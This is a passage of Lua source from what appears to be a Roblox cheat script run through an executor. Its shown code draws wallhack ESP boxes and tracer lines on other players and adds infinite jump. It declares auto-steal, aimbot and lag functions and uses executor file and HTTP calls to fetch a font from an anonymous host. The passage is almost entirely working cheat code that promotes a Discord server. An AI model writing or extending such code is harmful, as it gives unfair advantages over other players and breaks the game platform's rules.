        if me.Z > math.abs(cam.NearPlaneZ) and ESP._finite(me.X) and ESP._finite(me.Y) then
            origin = Vector2.new(me.X, me.Y)
        end
    end
    for p, data in pairs(ESP.Objects) do
        if p.Parent ~= Players then
            ESP.removeForPlayer(p)
        else
            local char = p.Character
            if char ~= data.char then
                ESP.createForPlayer(p)
            else
                local anchor = char and ESP._bodyAnchor(char)
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                local ld, info = ESP._lineData[p], ESP._infoCache[p]
                local alive = anchor and hum and hum.Health > 0
                local visible = false
                data.boxFrame.Visible = false
                if info then info.root.Visible = false end
                if ld then ld.renderer.Visible = false end
                if alive then
                    local x1, y1, x2, y2 = ESP._bodyBounds(char, cam, vp, anchor)
                    if x1 then
                        visible = true
                        data.boxFrame.Position = UDim2.fromOffset(x1, y1)
                        data.boxFrame.Size = UDim2.fromOffset(x2 - x1, y2 - y1)
                        data.boxStroke.Color = accent
                        data.boxFrame.Visible = true
                        if info and info.root.Parent then
                            local head = char:FindFirstChild("Head")
                            local headPoint = head and head:IsA("BasePart") and cam:WorldToViewportPoint(head.Position)
                            local cx = (headPoint and headPoint.Z > 0 and headPoint.X) or (x1 + x2) * 0.5
                            -- Whole panel stays above all animated limbs, so the
                            -- nickname never intersects the head or box border.
                            local bottom = y1 - 6
                            info.root.Position = UDim2.fromOffset(cx, bottom)
                            info.root.Visible = bottom > 0 and bottom - 46 < vp.Y
                            local velocity = anchor.AssemblyLinearVelocity
                            info.speedLbl.Text = string.format("%.1f", Vector3.new(velocity.X, 0, velocity.Z).Magnitude)
                            info.speedLbl.TextColor3 = accent
                            info.nameLbl.Text = ESP._nickname(p)
                        end
                    end
                    if State.espMode == "withLine" and ld then
                        local waist = ESP._waistPosition(char)
                        local projected = waist and cam:WorldToViewportPoint(waist)
                        if projected and projected.Z > math.abs(cam.NearPlaneZ)
                            and ESP._finite(projected.X) and ESP._finite(projected.Y) then
                            local from, to = ESP._clipLine(origin, Vector2.new(projected.X, projected.Y), vp)
                            if from and to then
                                local delta = to - from
                                if delta.Magnitude > 0.01 then
                                    ld.renderer.Position = UDim2.fromOffset((from.X + to.X) * 0.5, (from.Y + to.Y) * 0.5)
                                    ld.renderer.Size = UDim2.fromOffset(delta.Magnitude, 2)
                                    ld.renderer.Rotation = math.deg(math.atan2(delta.Y, delta.X))
                                    ld.renderer.BackgroundColor3 = accent
                                    ld.renderer.Visible = true
                                end
                            end
                        end
                    end
                end
                if data.highlight then
                    data.highlight.Enabled = visible
                    data.highlight.FillColor = accent
                    data.highlight.OutlineColor = accent
                end
            end
        end
    end
end

ESP.start = function()
	if ESP.Connection then return end
	State.espEnabled = true
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LP then
			pcall(function()
				ESP._watchPlayer(p)
				ESP.createForPlayer(p)
				ESP.createInfo(p)
			end)
		end
	end
	if ESP._boxAdd then pcall(function() ESP._boxAdd:Disconnect() end) end
	if ESP._boxRem then pcall(function() ESP._boxRem:Disconnect() end) end
	ESP._boxAdd = Players.PlayerAdded:Connect(function(p)
		pcall(function()
			ESP._watchPlayer(p)
			ESP.createForPlayer(p)
			ESP.createInfo(p)
		end)
	end)
	ESP._boxRem = Players.PlayerRemoving:Connect(function(p)
		ESP.removeForPlayer(p)
	end)
	local ok = pcall(function()
		RunService:BindToRenderStep("VX7_ESPBox2D", Enum.RenderPriority.Camera.Value + 2, ESP._updateBoxes)
	end)
	if ok then
		ESP.Connection = true
	else
		ESP.Connection = RunService.RenderStepped:Connect(ESP._updateBoxes)
	end
end

ESP.stop = function()
	State.espEnabled = false
	pcall(function() RunService:UnbindFromRenderStep("VX7_ESPBox2D") end)
	if type(ESP.Connection) == "userdata" then
		pcall(function() ESP.Connection:Disconnect() end)
	end
	ESP.Connection = nil
	local list = {}
	for p in pairs(ESP._playerData) do table.insert(list, p) end
	for p in pairs(ESP._lineData) do table.insert(list, p) end
	for p in pairs(ESP.Objects) do table.insert(list, p) end
	for p in pairs(ESP._infoCache) do table.insert(list, p) end
	local seen = {}
	for _, p in ipairs(list) do
		if not seen[p] then
			seen[p] = true
			ESP.removeForPlayer(p)
		end
	end
	if ESP._boxAdd then pcall(function() ESP._boxAdd:Disconnect() end); ESP._boxAdd = nil end
	if ESP._boxRem then pcall(function() ESP._boxRem:Disconnect() end); ESP._boxRem = nil end
	if ESP._sg and ESP._sg.Parent then pcall(function() ESP._sg:Destroy() end) end
	ESP._sg = nil
	ESP.gui = nil
	if ESP._lineGui and ESP._lineGui.Parent then pcall(function() ESP._lineGui:Destroy() end) end
	ESP._lineGui = nil
end


-- ============================================================
-- HEAD LABEL SETUP (APENAS O NOSSO)
-- ============================================================
local function setupHeadLabel(player, char)
    if player ~= LP then return end -- SÓ CRIA PARA NÓS MESMOS

    local head = char:WaitForChild("Head", 5)
    if not head then return end

    for _,v in ipairs(head:GetChildren()) do
        if v:IsA("BillboardGui") and (v.Name == "NoxyBB" or v.Name == "GreenDuelsBB" or v.Name == "BlastSpeedBill") then
            v:Destroy()
        end
    end

    -- Dense glossy overhead: discord + mode/speed with white shine sweep
    local bb = Instance.new("BillboardGui", head)
    bb.Name = "GreenDuelsBB"
    bb.Size = UDim2.fromOffset(220, 56)
    bb.StudsOffset = Vector3.new(0, 2.55, 0)
    bb.AlwaysOnTop = true
    bb.LightInfluence = 0
    bb.MaxDistance = 0
    bb.ResetOnSpawn = false

    local function styleSpeedText(lbl, size)
        lbl.Font = Enum.Font.GothamBlack
        lbl.TextSize = size
        lbl.TextScaled = false
        lbl.TextStrokeTransparency = 0.25
        lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        lbl.TextColor3 = Color3.fromRGB(255, 255, 255)

        local oldGrad = lbl:FindFirstChild("BlastHeadGrad")
        if oldGrad then oldGrad:Destroy() end

        local grad = Instance.new("UIGradient")
        grad.Name = "BlastHeadGrad"
        local baseColor = (State.colorApi and State.colorApi.accent) or Color3.fromRGB(235, 35, 45)
        grad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, baseColor),
            ColorSequenceKeypoint.new(0.65, Color3.fromRGB(255, 190, 130)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
        })
        grad.Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0),
            NumberSequenceKeypoint.new(0.65, 0),
            NumberSequenceKeypoint.new(1, 0.45),
        })
        grad.Rotation = 0
        grad.Parent = lbl

        table.insert(State.colorTags, lbl)

        local old = lbl:FindFirstChild("BlastOHShine")
        if old then old:Destroy() end
    end

    local tagLbl = Instance.new("TextLabel", bb)
    tagLbl.Size = UDim2.new(1, 0, 0, 22)
    tagLbl.Position = UDim2.new(0, 0, 0, 0)
    tagLbl.BackgroundTransparency = 1
    tagLbl.Text = ".gg/VwV4j8FAD"
    tagLbl.TextXAlignment = Enum.TextXAlignment.Center
    styleSpeedText(tagLbl, 16)

    SPD.speedLabel = Instance.new("TextLabel", bb)
    SPD.speedLabel.Name = "SpeedBillLbl"
    SPD.speedLabel.Size = UDim2.new(1, 0, 0, 28)
    SPD.speedLabel.Position = UDim2.new(0, 0, 0, 24)
    SPD.speedLabel.BackgroundTransparency = 1
    SPD.speedLabel.Text = "Normal  59"
    SPD.speedLabel.TextXAlignment = Enum.TextXAlignment.Center
    styleSpeedText(SPD.speedLabel, 20)
end

-- Setup head labels (apenas para nós mesmos)
local function setupAllHeadLabels()
    if LP.Character then task.spawn(setupHeadLabel, LP, LP.Character) end
end

Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function(char) 
        task.wait(0.5)
        if State.espEnabled then 
            ESP.createForPlayer(p) 
        end 
    end)
end)

Players.PlayerRemoving:Connect(function(p) ESP.removeForPlayer(p) end)

-- Recria ESP quando o nosso personagem respawna
LP.CharacterAdded:Connect(function(char)
    task.wait(0.5)
    if State.espEnabled then
        ESP.stop()
        ESP.start()
    end
    setupHeadLabel(LP, char)
end)

-- Inicializa os head labels para todos os jogadores já online
setupAllHeadLabels()

-- NO CAM COLLISION
local _camCollConn = nil
local _camTransparencyTracker = {}
local function applyNoCamCollision(on)
    pcall(function()
        if _camCollConn then _camCollConn:Disconnect(); _camCollConn = nil end
        for part, originalTransp in pairs(_camTransparencyTracker) do
            pcall(function()
                if part and part.Parent then
                    part.LocalTransparencyModifier = originalTransp
                end
            end)
        end
        _camTransparencyTracker = {}
        if not on then return end
        _camCollConn = RunService.RenderStepped:Connect(function()
            if not State.noCamCollisionEnabled then return end
            local char = LP.Character
            if not char then return end
            local hrp = char:FindFirstChild("HumanoidRootPart")
            local cam = workspace.CurrentCamera
            if not hrp or not cam then return end
            local camPos = cam.CFrame.Position
            local charPos = hrp.Position + Vector3.new(0, 1.5, 0)
            local toChar = charPos - camPos
            local dist = toChar.Magnitude
            if dist < 0.3 then return end
            local rp = RaycastParams.new()
            rp.FilterType = Enum.RaycastFilterType.Exclude
            rp.FilterDescendantsInstances = {char}
            rp.IgnoreWater = true
            local hitThisFrame = {}
            local origin = camPos
            local remaining = toChar
            for _ = 1, 12 do
                if remaining.Magnitude < 0.2 then break end
                local res = workspace:Raycast(origin, remaining, rp)
                if not res then break end
                local part = res.Instance
                if part and part:IsA("BasePart") and not part:IsDescendantOf(char) then
                    hitThisFrame[part] = true
                    if _camTransparencyTracker[part] == nil then
                        _camTransparencyTracker[part] = part.LocalTransparencyModifier
                    end
                    part.LocalTransparencyModifier = 1
                end
                origin = res.Position + remaining.Unit * 0.02
                remaining = charPos - origin
            end
            for part, orig in pairs(_camTransparencyTracker) do
                if not hitThisFrame[part] then
                    pcall(function()
                        if part and part.Parent then part.LocalTransparencyModifier = orig end
                    end)
                    _camTransparencyTracker[part] = nil
                end
            end
        end)
    end)
end

local function _vynxFontDontTouch(this)
    local ok, result = pcall(function()
        if not (this:IsA("TextLabel") or this:IsA("TextButton") or this:IsA("TextBox")) then
            return true
        end
        if this.TextStrokeTransparency ~= 1 then return false end
        local cur = tostring(this.FontFace)
        return cur == _vynxFontBadfont or string.find(cur, "BuilderIcons") ~= nil
    end)
    return not ok or result
end

local function _vynxFontChangeIt(txt)
    pcall(function()
        if not (txt:IsA("TextLabel") or txt:IsA("TextButton") or txt:IsA("TextBox")) then return end
        if _vynxFontDontTouch(txt) then return end
        if not _vynxFontOriginals[txt] then
            _vynxFontOriginals[txt] = txt.FontFace
        end
        txt.FontFace = _vynxFontMyfont
    end)
end

local _vynxFontSetupStarted = false
local _vynxFontSetupComplete = false

local function _vynxFontSetupAsync()
    if _vynxFontMyfont then 
        _vynxFontSetupComplete = true
        return 
    end
    if _vynxFontSetupStarted then return end -- Don't start multiple setup processes
    _vynxFontSetupStarted = true
    task.spawn(function() -- Run in background
        local ok = pcall(function()
            local httpsvc = game:GetService("HttpService")
            if not isfile("starborn.ttf") then
                writefile("starborn.ttf", game:HttpGet("https://granny.anondrop.net/uploads/6c2505542959f371/Starborn.ttf"))
            end
            writefile("starborn.json", httpsvc:JSONEncode({
                name = "Starborn",
                faces = {{name = "Regular", weight = 400, style = "normal", assetId = getcustomasset("starborn.ttf")}}
            }))
            _vynxFontMyfont = Font.new(getcustomasset("starborn.json"))
            _vynxFontBadfont = tostring(Font.new("rbxasset://LuaPackages/Packages/_Index/BuilderIcons/BuilderIcons/BuilderIcons.json"))
            _vynxFontSetupComplete = true
        end)
        if not ok then
            _vynxFontSetupStarted = false
        end
    end)
end

local function enableCustomFont()
    if _vynxFontEnabled then return end
    _vynxFontSetupAsync() -- Start setup in background
    _vynxFontEnabled = true
    -- Wait for setup to complete in the background
    task.spawn(function()
        while not _vynxFontSetupComplete and _vynxFontEnabled do
            task.wait(0.1)
        end
        if not _vynxFontEnabled or not _vynxFontMyfont then return end
        -- Apply font once it's ready
        for _, v in pairs(game:GetDescendants()) do
            _vynxFontChangeIt(v)
        end
        _vynxFontConn = game.DescendantAdded:Connect(function(obj)
            if _vynxFontEnabled then _vynxFontChangeIt(obj) end
        end)
    end)
end

local function disableCustomFont()
    _vynxFontEnabled = false
    if _vynxFontConn then pcall(function() _vynxFontConn:Disconnect() end); _vynxFontConn = nil end
    for obj, origFont in pairs(_vynxFontOriginals) do
        pcall(function()
            if obj and obj.Parent then obj.FontFace = origFont end
        end)
    end
    _vynxFontOriginals = {}
end

local function applyTheme()
    applyCustomSky(State.gameTheme)
end

local function updateThemeUI()
    if toggleRefs.themeCycleLabel then
        toggleRefs.themeCycleLabel.Text = State.gameTheme
    end
end

local function updateTryhardAnimModeUI()
    if toggleRefs.tryhardAnimModeLabel then
        toggleRefs.tryhardAnimModeLabel.Text = State.tryhardAnimMode or "V1"
    end
end

-- Forward declarations (necessario porque os toggles abaixo referenciam estas funcoes
-- antes delas serem definidas mais abaixo no arquivo)
local setCustomAnims
local startUnwalk, stopUnwalk
local startBatCounter, stopBatCounter
local startBatAimbot, stopBatAimbot
local startAutoSteal, stopAutoSteal
-- Rebind Smoke Ambitious start/stop onto locals (avoid global shadow)
startAutoSteal = function()
    autoStealEnabled = true
    State.autoStealEnabled = true
    Steal.AutoStealEnabled = true
    _G.autoStealEnabled = true
    if _G._VLESSVSApplySyncAfterHit then _G._VLESSVSApplySyncAfterHit() end
    if type(_G.AmbitiousAutoStealSync) == "function" then
        pcall(_G.AmbitiousAutoStealSync)
    end
    if _G.StealBar and _G.StealBar.SetEnabled then pcall(_G.StealBar.SetEnabled, true) end
end
stopAutoSteal = function()
    autoStealEnabled = false
    State.autoStealEnabled = false
    Steal.AutoStealEnabled = false
    _G.autoStealEnabled = false
    if _G._VLESSVSApplySyncAfterHit then _G._VLESSVSApplySyncAfterHit() end
    if type(_G.AmbitiousAutoStealSync) == "function" then
        pcall(_G.AmbitiousAutoStealSync)
    end
    if _G.AmbitiousNormalAutoStealStop then pcall(_G.AmbitiousNormalAutoStealStop) end
    if _G.AmbitiousSemiAutoStealStop then pcall(_G.AmbitiousSemiAutoStealStop) end
    if _G.AmbitiousSemiV2AutoStealStop then pcall(_G.AmbitiousSemiV2AutoStealStop) end
    if _G.StealBar and _G.StealBar.SetEnabled then pcall(_G.StealBar.SetEnabled, false) end
    if _G.StealBar and _G.StealBar.Reset then pcall(_G.StealBar.Reset) end
end
local startAutoLeft, stopAutoLeft, startAutoRight, stopAutoRight
local setupMedusaCounter, stopMedusaCounter
local doTpDown, runDropBrainrot, stopDropBrainrot, toggleDuelLagger
local startInfJump, stopInfJump
local getClosestPlayer, tryHitVisionBat

-- ============================================================
-- ANIMATION PACK SELECTOR (portado do XZZ DUELS)
-- ============================================================
do
    _G.BlastAnimationPacks = {
        ["Hit Harder"] = {
            idle1="rbxassetid://133806214992291", idle2="rbxassetid://94970088341563",
            walk="rbxassetid://707897309", run="rbxassetid://707861613",
            jump="rbxassetid://116936326516985", fall="rbxassetid://116936326516985",
            climb="rbxassetid://507765644",
        },
        ["Crazy"] = {
            idle1="rbxassetid://133806214992291", idle2="rbxassetid://94970088341563",
            walk="rbxassetid://134824450619865", run="rbxassetid://134824450619865",
            jump="rbxassetid://121454505477205", fall="rbxassetid://94788218468396",
            swimIdle="rbxassetid://121454505477205", swim="rbxassetid://121454505477205",
            climb="rbxassetid://121454505477205",
        },
        ["Zombie"] = {
            idle1="rbxassetid://616158929", idle2="rbxassetid://616158929",
            walk="rbxassetid://616168032", run="rbxassetid://616163682",
            jump="rbxassetid://616161997", fall="rbxassetid://616157476", climb="rbxassetid://616156119",
        },
        ["Ninja"] = {
            idle1="rbxassetid://656117400", idle2="rbxassetid://656117400",
            walk="rbxassetid://656121766", run="rbxassetid://656118852",
            jump="rbxassetid://656117878", fall="rbxassetid://656115606", climb="rbxassetid://656114359",
        },
        ["Knight"] = {
            idle1="rbxassetid://657595757", idle2="rbxassetid://657595757",
            walk="rbxassetid://657552124", run="rbxassetid://657564596",
            jump="rbxassetid://658409194", fall="rbxassetid://657600338", climb="rbxassetid://658360781",
        },
        ["Elder"] = {
            idle1="rbxassetid://845397899", idle2="rbxassetid://845397899",
            walk="rbxassetid://845403856", run="rbxassetid://845386501",
            jump="rbxassetid://845398858", fall="rbxassetid://845397673", climb="rbxassetid://845392038",
        },
        ["Levitate"] = {
            idle1="rbxassetid://616006778", idle2="rbxassetid://616006778",
            walk="rbxassetid://616013216", run="rbxassetid://616013216",
            jump="rbxassetid://616008936", fall="rbxassetid://616005863", climb="rbxassetid://616003713",
        },
        ["Astronaut"] = {
            idle1="rbxassetid://891621366", idle2="rbxassetid://891621366",
            walk="rbxassetid://891636393", run="rbxassetid://891636393",
            jump="rbxassetid://891627522", fall="rbxassetid://891617961", climb="rbxassetid://891609353",
        },
        ["Pirate"] = {
            idle1="rbxassetid://750781874", idle2="rbxassetid://750781874",
            walk="rbxassetid://750785693", run="rbxassetid://750783738",
            jump="rbxassetid://750782230", fall="rbxassetid://750780242", climb="rbxassetid://750779899",
        },
        ["Toy"] = {
            idle1="rbxassetid://782841498", idle2="rbxassetid://782841498",
            walk="rbxassetid://782843345", run="rbxassetid://782842708",
            jump="rbxassetid://782847020", fall="rbxassetid://782846423", climb="rbxassetid://782843869",
        },
        ["Vampire"] = {
            idle1="rbxassetid://1083445855", idle2="rbxassetid://1083445855",
            walk="rbxassetid://1083473930", run="rbxassetid://1083462077",
            jump="rbxassetid://1083455352", fall="rbxassetid://1083443587", climb="rbxassetid://1083439238",
        },
        ["Werewolf"] = {
            idle1="rbxassetid://1083195517", idle2="rbxassetid://1083195517",
            walk="rbxassetid://1083178339", run="rbxassetid://1083216690",
            jump="rbxassetid://1083218792", fall="rbxassetid://1083189019", climb="rbxassetid://1083182000",
        },
        ["Rthro"] = {
            idle1="rbxassetid://2510196951", idle2="rbxassetid://2510196951",
            walk="rbxassetid://2510202577", run="rbxassetid://2510198475",
            jump="rbxassetid://2510197830", fall="rbxassetid://2510195892", climb="rbxassetid://2510192778",
        },
        ["Stylish"] = {
            idle1="rbxassetid://616136790", idle2="rbxassetid://616136790",
            walk="rbxassetid://616146177", run="rbxassetid://616140816",
            jump="rbxassetid://616139451", fall="rbxassetid://616134815", climb="rbxassetid://616133594",
        },
    }
    _G.BlastAnimationPackList = {
        "OFF", "Unwalk", "Hit Harder", "Crazy", "Zombie", "Ninja", "Knight", "Elder",
        "Levitate", "Astronaut", "Pirate", "Toy", "Vampire", "Werewolf", "Rthro", "Stylish",
    }
    _G.BlastAnimationPackState = {character=nil, original=nil}

    local packState = _G.BlastAnimationPackState
    local function getAnimate(char)
        char = char or LP.Character
        return char and char:FindFirstChild("Animate") or nil
    end
    local function getAnimation(animate, folderName, animationName)
        local folder = animate and animate:FindFirstChild(folderName)
        return folder and folder:FindFirstChild(animationName) or nil
    end
    local function setAnimationId(object, id)
        if object and id then pcall(function() object.AnimationId = id end) end
    end
    local function stopPlaying(char)
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local animator = hum:FindFirstChildOfClass("Animator")
        local tracks = animator and animator:GetPlayingAnimationTracks() or hum:GetPlayingAnimationTracks()
        for _, track in ipairs(tracks) do pcall(function() track:Stop(0) end) end
    end
    local function reloadAnimate(animate)
        if not animate then return end
        pcall(function()
            animate.Disabled = true
            task.wait()
            animate.Disabled = false
        end)
    end
    local function backupOriginal(char, animate)
        if packState.character ~= char then
            packState.character = char
            packState.original = nil
        end
        if packState.original then return end
        local function id(folder, object)
            local anim = getAnimation(animate, folder, object)
            return anim and anim.AnimationId or nil
        end
        packState.original = {
            idle1=id("idle","Animation1"), idle2=id("idle","Animation2"),
            walk=id("walk","WalkAnim"), run=id("run","RunAnim"),
            jump=id("jump","JumpAnim"), fall=id("fall","FallAnim"),
            swim=id("swim","Swim"), swimIdle=id("swimidle","SwimIdle"),
            climb=id("climb","ClimbAnim"),
        }
    end
    local function applyIds(char, animate, pack)
        if not pack then return end
        stopPlaying(char)
        setAnimationId(getAnimation(animate,"idle","Animation1"),pack.idle1)
        setAnimationId(getAnimation(animate,"idle","Animation2"),pack.idle2)
        setAnimationId(getAnimation(animate,"walk","WalkAnim"),pack.walk)
        setAnimationId(getAnimation(animate,"run","RunAnim"),pack.run)
        setAnimationId(getAnimation(animate,"jump","JumpAnim"),pack.jump)
        setAnimationId(getAnimation(animate,"fall","FallAnim"),pack.fall)
        setAnimationId(getAnimation(animate,"swim","Swim"),pack.swim)
        setAnimationId(getAnimation(animate,"swimidle","SwimIdle"),pack.swimIdle)
        setAnimationId(getAnimation(animate,"climb","ClimbAnim"),pack.climb)
        reloadAnimate(animate)
    end
    local function validPack(name)
        for _, packName in ipairs(_G.BlastAnimationPackList) do
            if packName == name then return true end
        end
        return false
    end
    local function getIndex(name)
        for index, packName in ipairs(_G.BlastAnimationPackList) do
            if packName == name then return index end
        end
        return 1
    end
    local function applyPack(name)
        name = validPack(name) and name or "OFF"
        local previousPack = State.animationPack or "OFF"

        if State.unwalkEnabled and (previousPack == "Unwalk" or (name ~= "OFF" and name ~= "Unwalk")) then
            State.unwalkEnabled = false
            if stopUnwalk then stopUnwalk() end
            if toggleRefs.unwalk then toggleRefs.unwalk(false, true) end
        end

        if name ~= "OFF" and State.tryhardAnimEnabled then
            State.tryhardAnimEnabled = false
            if toggleRefs.tryhardAnim then toggleRefs.tryhardAnim(false, true) end
            if setCustomAnims then setCustomAnims() end
            packState.original = nil -- salva novamente as animacoes padrao apos desligar o Tryhard
        end

        State.animationPack = name
        local char = LP.Character
        if not char then return end
        local animate = getAnimate(char) or char:WaitForChild("Animate", 6)
        if not animate then return end
        backupOriginal(char, animate)

        if name == "Unwalk" then
            applyIds(char, animate, packState.original)
            State.unwalkEnabled = true
            if startUnwalk then startUnwalk() end
            if toggleRefs.unwalk then toggleRefs.unwalk(true, true) end
            return
        end
        if name == "OFF" then
            applyIds(char, animate, packState.original)
            return
        end
        applyIds(char, animate, _G.BlastAnimationPacks[name])
    end

    _G.BlastAnimationPack = {
        Apply=applyPack,
        GetIndex=getIndex,
        List=_G.BlastAnimationPackList,
    }

    trackConn(LP.CharacterAdded:Connect(function(char)
        task.wait(0.65)
        packState.character = nil
        packState.original = nil
        if State.animationPack and State.animationPack ~= "OFF" then
            applyPack(State.animationPack)
        end
    end))
end


-- ============================================================
-- HEADLES / KORBLOX (separados)
-- ============================================================
_G.BlastHiddenAccessories = _G.BlastHiddenAccessories or {}

function _G.BlastApplyHeadless(char)
    char = char or LP.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if head then
        head.Transparency = 1
        head.CanCollide = false
        pcall(function() head.LocalTransparencyModifier = 1 end)
        local face = head:FindFirstChild("face") or head:FindFirstChild("Face")
        if face then pcall(function() face.Transparency = 1 end) end
        for _, decal in ipairs(head:GetChildren()) do
            if decal:IsA("Decal") then pcall(function() decal.Transparency = 1 end) end
        end
    end
    pcall(function()
        local neck = char:FindFirstChild("Neck") or (char:FindFirstChild("Torso") and char.Torso:FindFirstChild("Neck"))
        if not neck then
            local torso = char:FindFirstChild("UpperTorso")
            neck = torso and torso:FindFirstChild("Neck")
        end
        if neck then neck.Enabled = false end
    end)
    for _, v in ipairs(char:GetChildren()) do
        if v:IsA("Accessory") then
            local handle = v:FindFirstChild("Handle")
            local weldedToHead = false
            pcall(function()
                local w = v:FindFirstChildWhichIsA("Weld", true) or v:FindFirstChildWhichIsA("WeldConstraint", true) or v:FindFirstChildWhichIsA("Motor6D", true)
                if w then
                    local p0, p1 = w.Part0, w.Part1
                    if (p0 and p0.Name == "Head") or (p1 and p1.Name == "Head") then
                        weldedToHead = true
                    end
                end
                if handle and handle:FindFirstChild("AccessoryWeld") then
                    local aw = handle.AccessoryWeld
                    if (aw.Part0 and aw.Part0.Name == "Head") or (aw.Part1 and aw.Part1.Name == "Head") then
                        weldedToHead = true
                    end
                end
            end)
            if weldedToHead then
                v.Parent = nil
                table.insert(_G.BlastHiddenAccessories, v)
            end
        end
    end
end

function _G.BlastStopHeadless(char)
    char = char or LP.Character
    if char then
        local head = char:FindFirstChild("Head")
        if head then
            head.Transparency = 0
            pcall(function() head.LocalTransparencyModifier = 0 end)
            local face = head:FindFirstChild("face") or head:FindFirstChild("Face")
            if face then pcall(function() face.Transparency = 0 end) end
            for _, decal in ipairs(head:GetChildren()) do
                if decal:IsA("Decal") then pcall(function() decal.Transparency = 0 end) end
            end
        end
        pcall(function()
            local neck = char:FindFirstChild("Neck") or (char:FindFirstChild("Torso") and char.Torso:FindFirstChild("Neck"))
            if not neck then
                local torso = char:FindFirstChild("UpperTorso")
                neck = torso and torso:FindFirstChild("Neck")
            end
            if neck then neck.Enabled = true end
        end)
        for _, acc in ipairs(_G.BlastHiddenAccessories) do
            pcall(function()
                if acc and acc.Parent == nil then acc.Parent = char end
            end)
        end
    end
    _G.BlastHiddenAccessories = {}
end

function _G.BlastApplyKorblox(char)
    char = char or LP.Character
    if not char then return end
    local config = {
        id = "rbxassetid://139607718",
        hide = {"RightUpperLeg", "RightLowerLeg", "RightFoot", "Right Leg"},
    }
    local target = char:FindFirstChild("RightUpperLeg") or char:FindFirstChild("Right Leg")
    if not target then return end
    local oldAsset = char:FindFirstChild("Korblox_RightLeg")
    if oldAsset then pcall(function() oldAsset:Destroy() end) end
    for _, partName in ipairs(config.hide) do
        local limb = char:FindFirstChild(partName)
        if limb and limb:IsA("BasePart") then limb.Transparency = 1 end
    end
    local objects
    local ok = pcall(function()
        if game.GetObjects then
            objects = game:GetObjects(config.id)
        end
    end)
    if ok and objects and objects[1] then
        local assetModel = objects[1]
        assetModel.Name = "Korblox_RightLeg"
        local mainMesh = assetModel:IsA("BasePart") and assetModel or assetModel:FindFirstChildWhichIsA("BasePart", true)
        if mainMesh then
            mainMesh.CanCollide = false
            pcall(function() mainMesh.CFrame = target.CFrame end)
            local weld = Instance.new("WeldConstraint")
            weld.Part0 = target
            weld.Part1 = mainMesh
            weld.Parent = mainMesh
            assetModel.Parent = char
        end
    end
end

function _G.BlastStopKorblox(char)
    char = char or LP.Character
    if not char then return end
    local oldAsset = char:FindFirstChild("Korblox_RightLeg")
    if oldAsset then pcall(function() oldAsset:Destroy() end) end
    for _, partName in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot", "Right Leg"}) do
        local limb = char:FindFirstChild(partName)
        if limb and limb:IsA("BasePart") then limb.Transparency = 0 end
    end
end

trackConn(LP.CharacterAdded:Connect(function(char)
    _G.BlastHiddenAccessories = {}
    task.spawn(function()
        char:WaitForChild("Head", 8)
        task.wait(0.8)
        if State.headlessEnabled then _G.BlastApplyHeadless(char) end
        if State.korbloxEnabled then _G.BlastApplyKorblox(char) end
    end)
end))

task.spawn(function()
    while task.wait(0.5) do
        local char = LP.Character
        if not char then continue end
        if State.headlessEnabled then
            pcall(function()
                local head = char:FindFirstChild("Head")
                if head then
                    if head.Transparency < 1 then head.Transparency = 1 end
                    head.LocalTransparencyModifier = 1
                    head.CanCollide = false
                    local face = head:FindFirstChild("face") or head:FindFirstChild("Face")
                    if face and face.Transparency < 1 then face.Transparency = 1 end
                end
            end)
        end
        if State.korbloxEnabled then
            pcall(function()
                for _, partName in ipairs({"RightUpperLeg", "RightLowerLeg", "RightFoot", "Right Leg"}) do
                    local limb = char:FindFirstChild(partName)
                    if limb and limb.Transparency < 1 then limb.Transparency = 1 end
                end
            end)
        end
    end
end)

-- ============================================================
-- HELPER FUNCTIONS
-- ============================================================
getKeyName = function(kc)
    local n = kc.Name
    if n == "Unknown" then return "-" end
    if n == "LeftControl" then return "CTRL" end
    if n == "RightControl" then return "RCTL" end
    if n == "LeftShift" then return "SHFT" end
    if n == "Space" then return "SPC" end
    -- Gamepad button names
    if n == "ButtonA" then return "A" end
    if n == "ButtonB" then return "B" end
    if n == "ButtonX" then return "X" end
    if n == "ButtonY" then return "Y" end
    if n == "ButtonL1" then return "LB" end
    if n == "ButtonR1" then return "RB" end
    if n == "ButtonL2" then return "LT" end
    if n == "ButtonR2" then return "RT" end
    if n == "ButtonL3" then return "LS" end
    if n == "ButtonR3" then return "RS" end
    if n == "ButtonSelect" then return "SEL" end
    if n == "ButtonStart" then return "STA" end
    if n == "DPadUp" then return "DU" end
    if n == "DPadDown" then return "DD" end
    if n == "DPadLeft" then return "DL" end
    if n == "DPadRight" then return "DR" end
    if n == "ButtonL2" then return "LT" end
    if n == "ButtonR2" then return "RT" end
    return n:sub(1, 4):upper()
end



-- ----------------------------------------------------------------
-- Infinite Jump (Clean Hub Duel — full replacement, no Blast reuse)
-- ----------------------------------------------------------------
local InfiniteJump = {
    enabled = false,
    jumpPower = 55,
    minVelocity = 30,
    jumpConn = nil,
    heartbeatConn = nil,
}

local function _cleanApplyJump(root)
    if not root then return end
    pcall(function()
        root.Velocity = Vector3.new(root.Velocity.X, InfiniteJump.jumpPower, root.Velocity.Z)
    end)
end

local function _cleanOnJumpRequest()
    if not InfiniteJump.enabled then return end
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if root then _cleanApplyJump(root) end
end

local function _cleanOnHeartbeat()
    if not InfiniteJump.enabled then return end
    local char = LP.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    local jumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or (hum.Jump == true)
    if jumpHeld and root.Velocity.Y < InfiniteJump.minVelocity then
        _cleanApplyJump(root)
    end
end

local function _cleanConnectEvents()
    if InfiniteJump.jumpConn then InfiniteJump.jumpConn:Disconnect() end
    if InfiniteJump.heartbeatConn then InfiniteJump.heartbeatConn:Disconnect() end
    InfiniteJump.jumpConn = UIS.JumpRequest:Connect(_cleanOnJumpRequest)
    InfiniteJump.heartbeatConn = RunService.Heartbeat:Connect(_cleanOnHeartbeat)
end

function InfiniteJump.start()
